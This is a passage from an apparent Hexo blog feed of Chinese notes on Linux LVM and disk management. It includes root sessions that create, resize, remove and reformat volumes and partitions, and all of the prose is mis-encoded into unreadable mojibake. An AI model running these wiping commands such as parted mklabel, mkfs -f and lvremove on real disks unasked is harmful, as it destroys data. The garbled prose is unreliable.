alt="image.png"></p><p>datavg-lv_data ä»500Gæ”¹ä¸º100G</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.cnblogs.com/lijiaman/p/12885649.html">Linux ç‰©ç†å·(PV)ã€é€»è¾‘å·(LV)ã€å·ç»„(VG)ç®¡ç†</a></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘(202212)ç£ç›˜ç®¡ç†</title>
    <link href="/2022/12/28/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202212)%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"/>
    <url>/2022/12/28/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202212)%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">æŸ¥çœ‹ç£ç›˜ä½¿ç”¨ç‡<br><span class="hljs-built_in">df</span> -h<br>æŸ¥çœ‹å•ä¸ªç›®å½•çš„æŒ‚è½½æƒ…å†µ(ç›®å½•å±äºå“ªä¸ªåˆ†åŒº)<br><span class="hljs-built_in">df</span> -h /home<br><br>fdisk -l<br>lsblk<br><span class="hljs-comment"># æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç±»å‹</span><br>lsblk -f <br><br>lvremove<br>vgremove<br>pvremove<br><br><span class="hljs-comment"># fdisk /dev/sdb</span><br>:d  <span class="hljs-comment"># åˆ é™¤</span><br>:w  <span class="hljs-comment"># ä¿å­˜</span><br>dosåˆ†åŒºè¡¨ ä¸€ä¸ªåˆ†åŒºæœ€å¤§2T<br>gptåˆ†åŒºè¡¨ ä¸é™åˆ¶<br><br>æŸ¥çœ‹æ˜¯ä¸æ˜¯ssd<br><span class="hljs-comment"># ä½¿ç”¨lsblkå‘½ä»¤è¿›è¡Œåˆ¤æ–­ï¼Œå‚æ•°-dè¡¨ç¤ºä»…æ˜¾ç¤ºè®¾å¤‡æœ¬èº«ï¼ˆä¸æ˜¾ç¤ºå…¶ä¸Šåˆ†åŒºï¼‰ï¼Œå‚æ•°-oè¡¨ç¤ºä»…æ˜¾ç¤ºç‰¹å®šçš„åˆ—ã€‚</span><br><span class="hljs-comment"># # 0æ˜¯ssd 1æ˜¯hdd</span><br><span class="hljs-comment"># lsblk -d -o name,rota   </span><br><span class="hljs-comment"># grep ^ /sys/block/*/queue/rotational</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># lvremove /dev/mapper/vgqjc-lvqjc </span><br>Do you really want to remove active logical volume vgqjc/lvqjc? [y/n]: y<br>  Logical volume <span class="hljs-string">&quot;lvqjc&quot;</span> successfully removed<br>[root@localhost ~]<span class="hljs-comment"># vgremove /dev/mapper/vgqjc</span><br>  Volume group <span class="hljs-string">&quot;vgqjc&quot;</span> successfully removed<br>[root@localhost ~]<span class="hljs-comment"># pvremove /dev/sdl</span><br>  Labels on physical volume <span class="hljs-string">&quot;/dev/sdl&quot;</span> successfully wiped.<br>[root@localhost ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@zqzt-wx13f33-zbhx08w ~]<span class="hljs-comment"># lsblk -d -o name,rota</span><br>NAME ROTA<br>sda     1<br>sdb     1<br>[root@zqzt-wx13f33-zbhx08w ~]<span class="hljs-comment">#</span><br>[root@zqzt-wx13f33-zbhx08w ~]<span class="hljs-comment"># grep ^ /sys/block/*/queue/rotational</span><br>/sys/block/dm-0/queue/rotational:1<br>/sys/block/dm-1/queue/rotational:1<br>/sys/block/sda/queue/rotational:1<br>/sys/block/sdb/queue/rotational:1<br><br></code></pre></td></tr></table></figure><p><code>fdisk</code>å‘½ä»¤ä¸­deviceé€šå¸¸æ˜¯<code>/dev/hda</code>ã€<code>/dev/hdb</code>â€¦.(IDEæ¥å£ç±»å‹çš„ç¡¬ç›˜è®¾å¤‡å)æˆ–<code>/dev/sda</code>ã€<code>/dev/sdb</code>â€¦.(SCSIæ¥å£ç±»å‹ç¡¬ç›˜è®¾å¤‡å)ï¼Œè¡¨ç¤ºæ•´ä¸ªç¡¬ç›˜ï¼Œå¦‚æœç¡¬ç›˜è¢«åˆ†åŒºï¼Œåˆ™åœ¨è®¾å¤‡ååè¿½åŠ ä¸€ä¸ªæ•°å­—è¡¨ç¤ºæ­¤è®¾å¤‡çš„ç¬¬å‡ ä¸ªåˆ†åŒºã€‚å¦‚ä¸Šä¾‹ä¸­çš„<code>/dev/sda1</code>å’Œ<code>/dev/sda2</code></p><p>ç–‘é—®ï¼š<br>1.IDEæ¥å£ç±»å‹çš„ç¡¬ç›˜å’ŒSCSIæ¥å£ç±»å‹ç¡¬ç›˜æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ<br>2.&#x2F;etc&#x2F;mtabå’Œ&#x2F;etc&#x2F;fstabçš„åŒºåˆ«ï¼Ÿ</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gcode">lvdisplay<br>pvdisplay<br>vgdisplay<br><br>å¯ä»¥ä½¿ç”¨pvdisplay æˆ–è€…p<span class="hljs-attr">vscanæŸ¥çœ‹åˆ›å»ºçš„ç‰©ç†å·  </span><br><span class="hljs-attr">ä½¿ç”¨vgdisplay æˆ–è€…vgscan æŸ¥çœ‹å·ç»„  </span><br><span class="hljs-attr">ä½¿ç”¨lvscan æˆ–è€…lvdisplayæŸ¥çœ‹[é€»è¾‘å·](https://so.csdn.net/so/search?q=%E9</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span>BB<span class="hljs-meta">%</span>E<span class="hljs-number">8</span><span class="hljs-meta">%</span>BE<span class="hljs-meta">%</span><span class="hljs-number">91</span><span class="hljs-meta">%</span>E<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>D<span class="hljs-meta">%</span>B<span class="hljs-number">7</span>&amp;spm=<span class="hljs-number">1001.2101</span><span class="hljs-number">.3001</span><span class="hljs-number">.7020</span>)  <br>ä½¿ç”¨df -hæŸ¥çœ‹æ˜¯å¦åˆ›å»ºæˆåŠŸ<br></code></pre></td></tr></table></figure><h2 id="éœ€æ±‚1ï¼šæ‰©å®¹æŸä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿç›®å½•"><a href="#éœ€æ±‚1ï¼šæ‰©å®¹æŸä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿç›®å½•" class="headerlink" title="éœ€æ±‚1ï¼šæ‰©å®¹æŸä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿç›®å½•"></a>éœ€æ±‚1ï¼šæ‰©å®¹æŸä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿç›®å½•</h2><h3 id="å½“å‰æƒ…å†µ"><a href="#å½“å‰æƒ…å†µ" class="headerlink" title="å½“å‰æƒ…å†µ"></a>å½“å‰æƒ…å†µ</h3><p>å½“å‰ç£ç›˜æƒ…å†µ</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230324155257.png" alt="image.png"></p><p>æŸ¥çœ‹ä½ æ–‡ä»¶ç³»ç»Ÿç±»å‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsblk -f<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230324155421.png" alt="image.png"></p><p>å½“å‰pvï¼Œvgï¼Œlvæƒ…å†µï¼š<br>å½“å‰sdbä¸‹æœ‰sdb1åˆ†åŒº<br>åŸºäº&#x2F;dev&#x2F;sdb1åˆ›å»ºäº†pv </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pvcreate Â /dev/sdb1 --force<br></code></pre></td></tr></table></figure><p>åŸºäºpvåˆ›å»ºäº†vg(datavgä¸ºvgçš„åå­—)                 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vgcreate Â datavg /dev/sdb1<br></code></pre></td></tr></table></figure><p>åŸºäºdatavgåˆ›å»ºäº†lv(lv_data_xxx_dataä¸ºlvçš„åå­—)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo lvcreate Â -L 4T -n lv_data_xxx_data datavg<br>sudo mkfs.xfs Â -f /dev/mapper/datavg-lv_data_xxx_data<br></code></pre></td></tr></table></figure><p>æŒ‚è½½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mount Â /dev/mapper/datavg-lv_data_xxx_data /vdata/xxx/data<br></code></pre></td></tr></table></figure><h3 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h3><p>æƒ³æŠŠsdcåˆ°sdmè¿™äº›ç£ç›˜å…¨éƒ¨æŒ‚è½½åˆ°&#x2F;vdata&#x2F;tg-paas&#x2F;dataä¸‹ï¼Œè¯¥å¦‚ä½•å®ç°ï¼Ÿ</p><h3 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo parted Â -s /dev/sdc mklabel gpt<br>sudo parted Â -s /dev/sdc mkpart primary xfs 0 100%<br>sudo mkfs.xfs Â -f /dev/sdc1<br><br>sudo pvcreate Â /dev/sdc1 --force<br><br>sudo vgextend datavg /dev/sdc1<br><br>lvresize -L +9.1T /dev/mapper/datavg-lv_data_xxx_data<br><br><span class="hljs-comment"># ä½¿ç”¨xfs_groupfsè¿›è¡Œåœ¨çº¿è°ƒæ•´xfsæ ¼å¼çš„æ–‡ä»¶ç³»ç»Ÿå¤§å°</span><br><span class="hljs-comment"># lsblk -f æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç±»å‹</span><br>xfs_growfs /dev/mapper/datavg-lv_data_xxx_data<br><br><span class="hljs-comment"># æŸ¥çœ‹å·²ç»æ‰©å®¹æˆåŠŸ</span><br>lsblk<br><span class="hljs-built_in">df</span> -h<br></code></pre></td></tr></table></figure><h2 id="ç»™æŸä¸ªç›®å½•-x2F-var-x2F-www-x2F-htmlæŒ‚ç›˜"><a href="#ç»™æŸä¸ªç›®å½•-x2F-var-x2F-www-x2F-htmlæŒ‚ç›˜" class="headerlink" title="ç»™æŸä¸ªç›®å½•&#x2F;var&#x2F;www&#x2F;htmlæŒ‚ç›˜"></a>ç»™æŸä¸ªç›®å½•&#x2F;var&#x2F;www&#x2F;htmlæŒ‚ç›˜</h2><h3 id="æŒ‚è½½"><a href="#æŒ‚è½½" class="headerlink" title="æŒ‚è½½"></a>æŒ‚è½½</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsblk<br><span class="hljs-built_in">df</span> -h | <span class="hljs-built_in">head</span> -n 20<br><br><span class="hljs-built_in">mkdir</span> -p /var/www/html<br><br><br>lvdisplay | sudo grep  lv_pkg<br>sudo lvcreate  -L 200G -n lv_pkg datavg<br>sudo mkfs.xfs  -f /dev/mapper/datavg-lv_pkg<br>sudo mount  | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg on /var/www/html&quot;</span><br>sudo mount  /dev/mapper/datavg-lv_pkg /var/www/html<br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg&quot;</span><br>sudo <span class="hljs-built_in">cat</span>  /etc/mtab  | sudo grep  datavg-lv_pkg &gt;&gt; /etc/fstab<br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg&quot;</span><br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab<br><br>sudo <span class="hljs-built_in">df</span> -h |grep html<br><span class="hljs-built_in">df</span> -h | grep var<br></code></pre></td></tr></table></figure><h3 id="è§£æŒ‚"><a href="#è§£æŒ‚" class="headerlink" title="è§£æŒ‚"></a>è§£æŒ‚</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># df -h | grep var</span><br>/dev/mapper/rootvg-lv_var               60G   49G   12G  81% /var<br>/dev/mapper/datavg-lv_log_tg_paas      500G  3.6G  497G   1% /var/log/tg-paas<br>/dev/mapper/datavg-lv_log_pods         500G  3.8G  497G   1% /var/log/pods<br>/dev/mapper/datavg-lv_pkg              1.0T  7.2G 1017G   1% /var/www/html<br><span class="hljs-comment"># cd ~</span><br><span class="hljs-comment"># umount /dev/mapper/datavg-lv_pkg</span><br><span class="hljs-comment"># df -h | grep var</span><br>/dev/mapper/rootvg-lv_var               60G   49G   12G  81% /var<br>/dev/mapper/datavg-lv_log_tg_paas      500G  3.6G  497G   1% /var/log/tg-paas<br>/dev/mapper/datavg-lv_log_pods         500G  3.8G  497G   1% /var/log/pods<br><br><span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 446.1G  0 disk <br>â”œâ”€sda1                          8:1    0   512M  0 part /boot/efi<br>â”œâ”€sda2                          8:2    0     1G  0 part /boot<br>â””â”€sda3                          8:3    0 444.6G  0 part <br>  â”œâ”€rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  â”œâ”€rootvg-lv_swap            252:1    0    16G  0 lvm  <br>  â”œâ”€rootvg-lv_var             252:3    0    60G  0 lvm  /var<br>  â”œâ”€rootvg-lv_home            252:6    0    20G  0 lvm  /home<br>  â””â”€rootvg-lv_kerneldata_etcd 252:8    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0   4.9T  0 disk <br>â””â”€sdb1                          8:17   0   4.9T  0 part <br>  â”œâ”€datavg-lv_data            252:2    0   500G  0 lvm  /vdata<br>  â”œâ”€datavg-lv_data_net        252:4    0   100G  0 lvm  /vdata/net<br>  â”œâ”€datavg-lv_log_pods        252:5    0   500G  0 lvm  /var/log/pods<br>  â”œâ”€datavg-lv_log_tg_paas     252:7    0   500G  0 lvm  /var/log/tg-paas<br>  â””â”€datavg-lv_pkg             252:9    0     1T  0 lvm  <br><br><br><span class="hljs-comment"># lvresize -L 200G /dev/mapper/datavg-lv_pkg</span><br>  WARNING: Reducing active logical volume to 200.00 GiB.<br>  THIS MAY DESTROY YOUR DATA (filesystem etc.)<br>Do you really want to reduce datavg/lv_pkg? [y/n]: y<br>  Size of logical volume datavg/lv_pkg changed from 1.00 TiB (262144 extents) to 200.00 GiB (51200 extents).<br>  Logical volume datavg/lv_pkg successfully resized.<br><br><br><span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 446.1G  0 disk <br>â”œâ”€sda1                          8:1    0   512M  0 part /boot/efi<br>â”œâ”€sda2                          8:2    0     1G  0 part /boot<br>â””â”€sda3                          8:3    0 444.6G  0 part <br>  â”œâ”€rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  â”œâ”€rootvg-lv_swap            252:1    0    16G  0 lvm  <br>  â”œâ”€rootvg-lv_var             252:3    0    60G  0 lvm  /var<br>  â”œâ”€rootvg-lv_home            252:6    0    20G  0 lvm  /home<br>  â””â”€rootvg-lv_kerneldata_etcd 252:8    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0   4.9T  0 disk <br>â””â”€sdb1                          8:17   0   4.9T  0 part <br>  â”œâ”€datavg-lv_data            252:2    0   500G  0 lvm  /vdata<br>  â”œâ”€datavg-lv_data_net        252:4    0   100G  0 lvm  /vdata/net<br>  â”œâ”€datavg-lv_log_pods        252:5    0   500G  0 lvm  /var/log/pods<br>  â”œâ”€datavg-lv_log_tg_paas     252:7    0   500G  0 lvm  /var/log/tg-paas<br>  â””â”€datavg-lv_pkg             252:9    0   200G  0 lvm  <br><br><br>sudo mkfs.xfs  -f /dev/mapper/datavg-lv_pkg<br>sudo mount  | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg on /var/www/html&quot;</span><br>sudo mount  /dev/mapper/datavg-lv_pkg /var/www/html<br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg&quot;</span><br><br>åˆ é™¤å¯¹åº”è¡Œ<br><br><br>sudo <span class="hljs-built_in">cat</span>  /etc/mtab  | sudo grep  datavg-lv_pkg &gt;&gt; /etc/fstab<br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg&quot;</span><br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab<br><br><br></code></pre></td></tr></table></figure><h2 id="éœ€æ±‚3ï¼šsdbä¸‹é¢åˆ†äº†ä¸‰ä¸ªåŒºï¼Œæƒ³è¦å˜æˆ1ä¸ª"><a href="#éœ€æ±‚3ï¼šsdbä¸‹é¢åˆ†äº†ä¸‰ä¸ªåŒºï¼Œæƒ³è¦å˜æˆ1ä¸ª" class="headerlink" title="éœ€æ±‚3ï¼šsdbä¸‹é¢åˆ†äº†ä¸‰ä¸ªåŒºï¼Œæƒ³è¦å˜æˆ1ä¸ª"></a>éœ€æ±‚3ï¼šsdbä¸‹é¢åˆ†äº†ä¸‰ä¸ªåŒºï¼Œæƒ³è¦å˜æˆ1ä¸ª</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 893.8G  0 disk <br>â”œâ”€sda1                          8:1    0   512M  0 part /boot/efi<br>â”œâ”€sda2                          8:2    0     1G  0 part /boot<br>â””â”€sda3                          8:3    0 892.3G  0 part <br>  â”œâ”€rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  â”œâ”€rootvg-lv_swap            252:1    0    16G  0 lvm  [SWAP]<br>  â”œâ”€rootvg-lv_var             252:2    0    60G  0 lvm  /var<br>  â”œâ”€rootvg-lv_home            252:3    0    20G  0 lvm  /home<br>  â””â”€rootvg-lv_kerneldata_etcd 252:4    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0  29.1T  0 disk <br>â”œâ”€sdb1                          8:17   0   512M  0 part <br>â”œâ”€sdb2                          8:18   0     1G  0 part <br>â””â”€sdb3                          8:19   0   7.3T  0 part <br>sdc                             8:32   0  29.1T  0 disk <br>nvme1n1                       259:0    0   1.5T  0 disk <br>nvme0n1                       259:1    0   1.5T  0 disk <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># ls /dev/sdb1</span><br>/dev/sdb1<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># echo $?</span><br>0<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># sudo ls -l /dev/mapper/ | sudo grep datavg</span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># echo $?</span><br>1<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># sudo parted  -s /dev/sdb mklabel gpt</span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 893.8G  0 disk <br>â”œâ”€sda1                          8:1    0   512M  0 part /boot/efi<br>â”œâ”€sda2                          8:2    0     1G  0 part /boot<br>â””â”€sda3                          8:3    0 892.3G  0 part <br>  â”œâ”€rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  â”œâ”€rootvg-lv_swap            252:1    0    16G  0 lvm  [SWAP]<br>  â”œâ”€rootvg-lv_var             252:2    0    60G  0 lvm  /var<br>  â”œâ”€rootvg-lv_home            252:3    0    20G  0 lvm  /home<br>  â””â”€rootvg-lv_kerneldata_etcd 252:4    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0  29.1T  0 disk <br>sdc                             8:32   0  29.1T  0 disk <br>nvme1n1                       259:0    0   1.5T  0 disk <br>nvme0n1                       259:1    0   1.5T  0 disk <br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># echo $?</span><br>0<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># sudo parted  -s /dev/sdb mkpart primary xfs 0 100%</span><br>Warning: The resulting partition is not properly aligned <span class="hljs-keyword">for</span> best performance: 34s % 2048s != 0s<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># sudo mkfs.xfs  -f /dev/sdb1</span><br>warning: device is not properly aligned /dev/sdb1<br>meta-data=/dev/sdb1              isize=512    agcount=32, agsize=244171712 blks<br>         =                       sectsz=512   attr=2, projid32bit=1<br>         =                       crc=1        finobt=1, sparse=1, rmapbt=0<br>         =                       reflink=1<br>data     =                       bsize=4096   blocks=7813494784, imaxpct=5<br>         =                       sunit=64     swidth=256 blks<br>naming   =version 2              bsize=4096   ascii-ci=0, ftype=1<br><span class="hljs-built_in">log</span>      =internal <span class="hljs-built_in">log</span>           bsize=4096   blocks=521728, version=2<br>         =                       sectsz=512   sunit=64 blks, lazy-count=1<br>realtime =none                   extsz=4096   blocks=0, rtextents=0<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 893.8G  0 disk <br>â”œâ”€sda1                          8:1    0   512M  0 part /boot/efi<br>â”œâ”€sda2                          8:2    0     1G  0 part /boot<br>â””â”€sda3                          8:3    0 892.3G  0 part <br>  â”œâ”€rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  â”œâ”€rootvg-lv_swap            252:1    0    16G  0 lvm  [SWAP]<br>  â”œâ”€rootvg-lv_var             252:2    0    60G  0 lvm  /var<br>  â”œâ”€rootvg-lv_home            252:3    0    20G  0 lvm  /home<br>  â””â”€rootvg-lv_kerneldata_etcd 252:4    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0  29.1T  0 disk <br>â””â”€sdb1                          8:17   0  29.1T  0 part <br>sdc                             8:32   0  29.1T  0 disk <br>nvme1n1                       259:0    0   1.5T  0 disk <br>nvme0n1                       259:1    0   1.5T  0 disk <br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>&#96;&#96;&#96;</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" 